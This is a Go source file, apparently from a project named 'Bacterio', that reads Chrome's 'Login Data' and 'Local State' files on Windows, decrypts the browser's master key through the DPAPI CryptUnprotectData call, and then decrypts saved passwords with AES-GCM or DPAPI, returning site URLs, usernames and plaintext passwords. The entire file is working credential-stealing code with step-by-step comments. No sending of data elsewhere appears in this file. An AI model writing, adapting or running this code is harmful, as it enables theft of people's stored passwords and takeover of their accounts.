package utils

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"syscall"
	"unsafe"

	"github.com/fr13n8/Bacterio/internal/models"
	_ "github.com/mattn/go-sqlite3"
)

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")

	DataPath       string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
	LocalStatePath string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
	// masterKey      []byte
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func GetMasterKey() ([]byte, error) {

	var masterKey []byte

	// Get the master key
	// The master key is the key with which chrome encode the passwords but it has some suffixes and we need to work on it
	jsonFile, err := os.Open(LocalStatePath) // The rough key is stored in the Local State File which is a json file
	if err != nil {
		return masterKey, err
	}

	defer jsonFile.Close()

	byteValue, err := ioutil.ReadAll(jsonFile)
	if err != nil {
		return masterKey, err
	}
	var result map[string]interface{}
	json.Unmarshal([]byte(byteValue), &result)
	roughKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string) // Found parsing the json in it
	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)                      // It's stored in Base64 so.. Let's decode it
	if err != nil {
		return nil, err
	}
	stringKey := string(decodedKey)
	stringKey = strings.Trim(stringKey, "DPAPI") // The key is encrypted using the windows DPAPI method and signed with it. the key looks like "DPAPI05546sdf879z456..." Let's Remove DPAPI.

	masterKey, err = Decrypt([]byte(stringKey)) // Decrypt the key using the dllcrypt32 dll.
	if err != nil {
		return masterKey, err
	}

	return masterKey, nil
}

func GetDecryptData(resp []models.Credentials, masterKey []byte) []*models.Credentials {
	credsArray := make([]*models.Credentials, 0, 10)
	for _, data := range resp {
		PASSWORD := data.PasswordValue
		URL := data.OriginUrl
		USERNAME := data.UsernameValue
		if strings.HasPrefix(PASSWORD, "v10") { // Means it's chrome 80 or higher
			PASSWORD = strings.Trim(PASSWORD, "v10")

			// Chrome Version is 80 or higher, switching to the AES 256 decrypt
			ciphertext := []byte(PASSWORD)
			c, err := aes.NewCipher(masterKey)
			if err != nil {

				fmt.Println(err)
			}
			gcm, err := cipher.NewGCM(c)
			if err != nil {
				fmt.Println(err)
			}
			nonceSize := gcm.NonceSize()
			if len(ciphertext) < nonceSize {
				fmt.Println(err)
			}

			nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
			plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
			if err != nil {
				fmt.Println(err)
			}
			if URL != " " && URL != "" {
				credsArray = append(credsArray, &models.Credentials{
					OriginUrl:     URL,
					UsernameValue: USERNAME,
					PasswordValue: string(plaintext),
				})
			}
		} else { //Means it's chrome v. < 80
			pass, err := Decrypt([]byte(PASSWORD))
			if err != nil {
				log.Fatal(err)
			}

			if URL != " " && URL != "" {
				credsArray = append(credsArray, &models.Credentials{
					OriginUrl:     URL,
					UsernameValue: USERNAME,
					PasswordValue: string(pass),
				})
			}
		}
	}
	return credsArray
}
